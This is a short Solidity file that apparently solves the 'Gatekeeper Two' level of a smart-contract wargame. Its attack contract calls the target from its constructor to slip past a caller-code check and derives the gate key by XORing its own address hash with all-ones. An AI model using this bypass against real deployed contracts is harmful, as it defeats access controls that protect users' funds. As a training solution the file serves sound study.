// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract DeployedGatekeeper {
  function enter(bytes8) public returns (bool) { }
}

contract GatekeeperTwoAttack {
  constructor(address _gatekeeperAddress) public {
    bytes8 gateKey = bytes8(
      uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1)
    );

    DeployedGatekeeper(_gatekeeperAddress).enter(gateKey);
  }
}